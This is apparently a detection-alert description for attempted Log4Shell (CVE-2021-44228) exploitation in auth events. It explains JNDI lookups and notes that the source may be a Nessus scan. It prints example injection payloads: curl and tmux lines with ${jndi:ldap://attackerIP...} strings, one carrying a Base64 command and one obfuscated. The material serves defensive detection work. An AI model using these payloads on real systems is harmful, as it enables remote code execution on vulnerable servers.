An auth event that features a syntax for a Java Naming and Directory Interface (JNDI) lookup function was identified. This activity may indicate that a threat actor is attempting to execute code associated with a known remote code execution (RCE) vulnerability, CVE-2021-44228. However, in this auth event the target_username indicates that the source may be the Nessus vulnerability scanner.

Examples:
> curl -H X-Api-Version: ${jndi:ldap://attackerIP:1234/aaa} 
> tmux set-buffer -- ${jndi:ldap://attackerIP:1234/Basic/Command/Base64/b64_encoded_command} 
> curl -H X-Api-Version: ${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}

JNDI allows software clients to discover and look up data and objects via a name. A threat actor can store these objects in various naming or directory services, such as Remote Method Invocation (RMI), Lightweight Directory Access Protocol (LDAP), or Domain Name Service (DNS). An attacker who can control log messages or log message parameters can exploit CVE-2021-44228 to execute arbitrary code loaded from a server (e.g., LDAP) when message lookup substitution is enabled.

